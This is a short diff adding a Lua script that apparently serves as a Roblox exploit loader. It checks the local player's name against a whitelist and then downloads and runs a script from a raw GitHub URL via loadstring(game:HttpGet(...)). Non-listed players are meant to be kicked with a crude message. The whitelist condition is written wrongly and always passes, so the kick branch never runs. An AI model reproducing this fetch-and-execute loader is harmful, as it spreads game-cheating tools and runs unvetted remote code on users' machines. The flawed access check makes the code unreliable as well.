@@ -1,0 +1,9 @@
+local name = game:GetService("Players").LocalPlayer.Name
+local lp = game:GetService("Players").LocalPlayer
+
+if name == "sleepyinjapan" or "zeroIogy" or "xohalz" or "coryisamazinglol" or "CheckingExplore" or "Extxs" then
+loadstring(game:HttpGet(('https://raw.githubusercontent.com/slIeepy/FFA/main/FREEFORALLSSCSCSC'),true))()
+return
+else
+lp:Kick("fuh outta here")
+end
